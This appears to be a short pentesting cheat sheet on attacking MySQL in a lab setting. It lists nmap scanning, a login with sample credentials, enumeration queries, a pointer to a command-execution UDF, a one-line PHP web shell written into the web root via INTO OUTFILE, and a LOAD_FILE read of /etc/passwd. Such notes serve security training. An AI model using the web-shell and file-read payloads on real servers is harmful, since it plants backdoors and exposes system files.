```shell-session

nmap -Pn -sV -sC -p1433 10.10.10.125

mysql -u username -pPassword123 -h 10.129.20.13
```

## SQL CMDs

```cmd-session
SHOW DATABASES;
USE <DATABASE>;    
SHOW TABLES;
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
SELECT * FROM users;

```
### System CMDs
`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

### Write Local Files
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
### Secure File Privileges
```shell-session
mysql> show variables like "secure_file_priv";
```

### Read Local Files
```shell-session
mysql> select LOAD_FILE("/etc/passwd");
```

## Default Databases
`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
## Tools
MySQLWorkbench

#MSSQL 
#mysql
#database 
#sql 